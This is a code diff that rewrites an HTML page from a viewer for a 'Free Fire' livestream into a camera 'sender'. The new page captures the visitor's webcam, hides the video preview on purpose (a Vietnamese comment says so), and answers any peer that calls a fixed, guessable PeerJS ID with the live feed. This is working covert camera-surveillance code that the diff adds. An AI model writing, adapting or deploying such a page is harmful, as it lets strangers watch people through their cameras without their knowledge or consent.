@@ -1,74 +1,43 @@
 <!DOCTYPE html>
-<html lang="vi">
+<html>
 <head>
   <meta charset="UTF-8">
-  <title>Xem Free Fire Stream</title>
+  <title>Sender - Phát camera</title>
   <style>
-    body {
-      margin: 0;
-      padding: 20px;
-      font-family: 'Segoe UI', sans-serif;
-      background: #111;
-      color: white;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
-
-    h1 {
-      margin-bottom: 20px;
-      text-align: center;
-    }
-
-    video {
-      width: 90%;
-      max-width: 400px;
-      margin: 10px 0;
-      border: 3px solid #fff;
-      border-radius: 10px;
-      background: black;
-    }
-
-    .label {
-      margin-top: 10px;
-      font-weight: bold;
-      font-size: 1rem;
+    /* Ẩn video camera trên giao diện */
+    #localVideo {
+      display: none;
     }
   </style>
 </head>
 <body>
-  <h1>📺 XEM LIVESTREAM</h1>
+  <video id="localVideo" autoplay muted playsinline></video>
 
-  <div class="label">Camera trước</div>
-  <video id="viewFront" autoplay playsinline controls muted></video>
-
-  <div class="label">Camera sau</div>
-  <video id="viewBack" autoplay playsinline controls muted></video>
-
-  <script src="https://cdn.jsdelivr.net/npm/peerjs@1.5.2/dist/peerjs.min.js"></script>
+  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
   <script>
-    function watchStream(peerId, videoElementId) {
-      const peer = new Peer(); // mỗi viewer tạo một peer riêng
-      peer.on("open", () => {
-        const call = peer.call(peerId, null);
-        call.on("stream", stream => {
-          document.getElementById(videoElementId).srcObject = stream;
-          console.log(`✅ Đang xem: ${peerId}`);
-        });
+    const VIDEO_ID = "my-fixed-stream-id";
 
-        call.on("error", err => {
-          console.error(`❌ Lỗi khi gọi ${peerId}:`, err);
-        });
-      });
+    const peer = new Peer(VIDEO_ID);
 
-      peer.on("error", err => {
-        console.error(`❌ PeerJS Error:`, err);
-      });
+    peer.on('open', id => {
+      console.log("Peer ID:", id);
+      startCamera();
+    });
+
+    function startCamera() {
+      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+        .then(stream => {
+          document.getElementById('localVideo').srcObject = stream;
+
+          peer.on('call', call => {
+            call.answer(stream);
+          });
+        })
+        .catch(error => {
+          console.error("Không truy cập được camera:", error);
+          alert("Không truy cập được camera.");
+        });
     }
-
-    // Gọi đúng ID stream từ bên máy quay
-    watchStream("stream-front", "viewFront");
-    watchStream("stream-back", "viewBack");
   </script>
 </body>
 </html>
